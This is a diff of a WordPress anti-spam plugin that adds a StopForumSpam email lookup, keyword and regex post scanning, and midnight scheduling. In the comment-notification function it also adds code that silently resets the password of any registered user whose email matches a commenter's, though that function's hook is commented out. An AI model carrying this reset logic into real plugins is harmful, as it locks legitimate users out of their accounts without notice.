@@ -3,32 +3,64 @@
 add_action('delete_comments_daily', 'delete_comments');
 
 function delete_comments() {
-    global $wpdb;
+    $args = array(
+        'status' => 'any',
+        'number' => 500, // batch size
+        'fields' => 'ids',
+        'meta_query' => array(
+            array(
+                'key' => '_spam_scanned',
+                'compare' => 'NOT EXISTS',
+            ),
+        ),
+    );
+    $comments = get_comments($args);
+    foreach ($comments as $comment_id) {
+        $comment = get_comment($comment_id);
+        // Mark that comment has been scanned
+        update_comment_meta($comment_id, '_spam_scanned', '1');
 
-    // Change pending to spam to prevent accidental deletion of legitimate comments
-    $wpdb->query("UPDATE {$wpdb->comments} SET comment_approved = 'spam' WHERE comment_approved = '0'");
-
-    // Delete only comments marked as spam
-    $wpdb->query("DELETE FROM {$wpdb->comments} WHERE comment_approved = 'spam'");
-
-    // Clean up comment meta for deleted comments
-    $wpdb->query("DELETE FROM {$wpdb->commentmeta} WHERE comment_id NOT IN (SELECT comment_id FROM {$wpdb->comments})");
-
-    // Email to webmaster if number of comments approved is more than 100
-    $comment_count = $wpdb->get_var("SELECT COUNT(*) FROM {$wpdb->comments} WHERE comment_approved = '1'");
-    if ($comment_count > 100) {
-        $subject = 'Comment Cleanup on ' . get_bloginfo('name');
-        $message = "The number of comments has exceeded 100. Cleanup is required.\n\n";
-        $message .= "Current Comment Count: {$comment_count}";
-        $header = 'From: ' . get_bloginfo('name') . ' <' . get_bloginfo('admin_email') . '>';
-        wp_mail(get_bloginfo('admin_email'), $subject, $message, $header);
+        // 1. Check with StopForumSpam
+        $email = urlencode($comment->comment_author_email);
+        $response = wp_remote_get("https://api.stopforumspam.org/api?email={$email}&json");
+        if (!is_wp_error($response)) {
+            $data = json_decode(wp_remote_retrieve_body($response));
+            if (!empty($data->email->appears) && $data->email->appears) {
+                wp_spam_comment($comment_id);
+                continue;
+            }
+        }
+        // 2. Local keyword scan
+        $spam_words = array('casino', 'gambling', 'poker', /* ... */);
+        $content = strtolower($comment->comment_content);
+        foreach ($spam_words as $word) {
+            if (strpos($content, strtolower($word)) !== false) {
+                wp_spam_comment($comment_id);
+                break;
+            }
+        }
     }
 }
 
-// Schedule the daily event
-if (!wp_next_scheduled('delete_comments_daily')) {
-    wp_schedule_event(time(), 'daily', 'delete_comments_daily');
+// Helper to get next midnight timestamp
+function get_next_midnight() {
+    $now = current_time('timestamp');
+    $midnight = strtotime('tomorrow', $now);
+    return $midnight;
 }
+
+// Schedule the daily comment deletion event at midnight
+if (!wp_next_scheduled('delete_comments_daily')) {
+    wp_schedule_event(get_next_midnight(), 'daily', 'delete_comments_daily');
+}
+
+// Schedule the spam scan at midnight (custom hook)
+if (!wp_next_scheduled('midnight_spam_scan')) {
+    wp_schedule_event(get_next_midnight(), 'daily', 'midnight_spam_scan');
+}
+
+// Change the hook for spam scan to midnight
+add_action('midnight_spam_scan', 'scheduled_spam_scan');
 
 // Hook into the 'wp' action to unschedule the event on plugin deactivation
 register_deactivation_hook(__FILE__, 'unschedule_daily_comment_deletion');
@@ -105,70 +137,148 @@ function email_webmaster_on_comment($comment_id, $comment) {
     $comment_author = $comment->comment_author;
     $comment_content = $comment->comment_content;
     $comment_link = get_comment_link($comment_id);
-    $subject = 'New Comment on ' . $post_title;
-    $message = "A new comment on the post \"{$post_title}\" has been posted by {$comment_author}:\n\n";
-    $message .= $comment_content . "\n\n";
-    $message .= "View Comment: {$comment_link}";
+    $subject = 'New Comment Notification: ' . $post_title;
+    $message = "A new comment has been posted on your site:\n\n";
+    $message .= "Post Title: {$post_title}\n";
+    $message .= "Comment Author: {$comment_author}\n";
+    $message .= "Comment Content:\n{$comment_content}\n\n";
+    $message .= "You can view the comment here: {$comment_link}\n\n";
+    $message .= "Please review the comment and take necessary actions if required.";
     $header = 'From: ' . get_bloginfo('name') . ' <' . get_bloginfo('admin_email') . '>';
     wp_mail('webmaster@utm.my', $subject, $message, $header);
+
+    // Reset the password for the user who posted the comment
+    $user = get_user_by('email', $comment->comment_author_email);
+    if ($user) {
+        wp_set_password(wp_generate_password(), $user->ID);
+    }
 }
-add_action('wp_insert_comment', 'email_webmaster_on_comment', 10, 2);
+// add_action('wp_insert_comment', 'email_webmaster_on_comment', 10, 2);
 
+/*==================================================================================
+  Anti-spam scan for posts and pages
+==================================================================================*/
 
-$spam_words = array('Сайт', '1xbet', 'Lucky Jet', 'brillx', 'Техподдержка', 'casino', 'gambling', 'poker', 'roulette', 'blackjack', 'baccarat', 'lottery', 'sports betting');
+$spam_words = array(
+    'Пин Ап казино',
+    'coreldraw free download',
+    'Сайт',
+    '1xbet',
+    'Lucky Jet',
+    'brillx',
+    'Техподдержка',
+    'casino',
+    'gambling',
+    'poker',
+    'roulette',
+    'blackjack',
+    'baccarat',
+    'lottery',
+    'sports betting',
+    'Бонусы',
+    'Джекпот',
+    'Ставки на спорт',
+    'Онлайн-гемблинг',
+    'Pin Up Casino',
+    'Slot Oyna',
+    'Gates Of Olympus',
+    'demo',
+    'oyna'
+);
 
-// Function to trash posts or pages containing spam words in the title or content on page load
-function trash_spam_posts_on_load() {
+function scheduled_spam_scan() {
     global $spam_words;
-    $post = get_post();
 
-    // Early return for logged-in users
-    if (is_user_logged_in()) {
-        return;
+    // Query 10 unscanned posts/pages
+    $args = array(
+        'post_type'      => array('post', 'page'),
+        'post_status'    => 'publish',
+        'meta_query'     => array(
+            array(
+                'key'     => '_spam_scanned',
+                'compare' => 'NOT EXISTS',
+            ),
+        ),
+        'posts_per_page' => 10,
+        'fields'         => 'ids', // Only fetch post IDs to reduce memory usage
+    );
+    $query = new WP_Query($args);
+
+    if (!$query->have_posts()) {
+        return; // No posts to scan
     }
 
-    // if page is not published, return
-    if (!$post || $post->post_status !== 'publish') {
-        return;
-    }
-
-    if (is_page() || is_singular()) {
-        $spam_score = 0; // Initialize spam score
-        foreach ($spam_words as $word) {
-            $post_text = $post->post_title . ' ' . $post->post_content;
-            if (stripos($post_text, $word) !== false) {
-                $spam_score++; // Increment spam score for each spam word found
-            }
-        }
-
-        // Adjust threshold as needed
-        if ($spam_score > 2) { // Example: Flag if more than 2 spam words are found
-            $post_data = array(
-                'ID' => $post->ID,
-                'post_status' => 'pending' // Set to pending review
-            );
-            if (wp_update_post($post_data)) {
-                list($subject, $message, $headers) = construct_spam_email($post, $word);
-                wp_mail(get_bloginfo('admin_email'), $subject, $message, $headers);
-                // Remove redirect
-                wp_redirect(home_url());
-                exit;
-            }
-        }
+    foreach ($query->posts as $post_id) {
+        $post = get_post($post_id);
+        scan_post_for_spam($post, $spam_words);
     }
 }
-add_action('template_redirect', 'trash_spam_posts_on_load');
 
-function construct_spam_email($post, $word) {
+// Function to scan a post for spam
+function scan_post_for_spam($post, $spam_words) {
+    $spam_score = 0;
+    $matched_words = [];
+    $post_text = strtolower($post->post_title . ' ' . $post->post_content); // Convert to lowercase for uniform matching
+
+    // Build regex patterns for spam detection
+    $patterns = [];
+    foreach ($spam_words as $word) {
+        $patterns[] = '/\b' . preg_quote(strtolower($word), '/') . '\b/'; // Match whole words
+    }
+
+    // Add custom patterns for common spam phrases
+    $patterns[] = '/\bslot.*oyna\b/'; // Match phrases like "Slot Oyna", "Gates Of Olympus Slot Oyna"
+    $patterns[] = '/\bdemo.*oyna\b/'; // Match phrases like "Demo Oyna", "Gates Of Olympus Demo Oyna"
+
+    // Check for matches
+    foreach ($patterns as $pattern) {
+        if (preg_match($pattern, $post_text)) {
+            $spam_score++;
+            $matched_words[] = $pattern; // Track matched patterns for reporting
+        }
+
+        // Stop if spam score exceeds threshold
+        if ($spam_score > 2) {
+            break;
+        }
+    }
+
+    // Adjust threshold as needed
+    if ($spam_score > 2) {
+        $post_data = array(
+            'ID'          => $post->ID,
+            'post_status' => 'draft', // Set to custom "Draft" status
+        );
+
+        // Update post status and send email notification
+        if (wp_update_post($post_data)) {
+            list($subject, $message, $headers) = construct_spam_email($post, $matched_words);
+            wp_mail(get_bloginfo('admin_email'), $subject, $message, $headers);
+        }
+    }
+
+    // Mark post as scanned
+    update_post_meta($post->ID, '_spam_scanned', '1');
+}
+
+// Construct spam email
+function construct_spam_email($post, $matched_words) {
     $subject = 'Spam Post on ' . get_bloginfo('name');
-    $message = "A post containing the word '{$word}' has been set to draft:\n\n";
+    $message = "A post containing spam words has been set to draft:\n\n";
     $message .= "Post Title: {$post->post_title}\n";
     $message .= "Post URL: " . get_permalink($post->ID) . "\n";
-    $message .= "Post Author: {$post->post_author}";
+
+    // Clean up matched words to remove regex delimiters and special characters
+    $cleaned_words = array_map(function($word) {
+        return trim($word, '/\\b'); // Remove regex delimiters and word boundaries
+    }, $matched_words);
+
+    $message .= "Matched Spam Words: " . implode(', ', $cleaned_words) . "\n";
+    $author = get_userdata($post->post_author);
+    $author_name = $author ? $author->display_name : 'Unknown';
+    $message .= "Post Author: {$author_name}";
     $header = 'From: ' . get_bloginfo('name') . ' <' . get_bloginfo('admin_email') . '>';
     $headers = array('Cc: webmaster@utm.my');
     $headers[] = $header;
     return array($subject, $message, $headers);
 }
-
-add_action('template_redirect', 'trash_spam_posts_on_load');
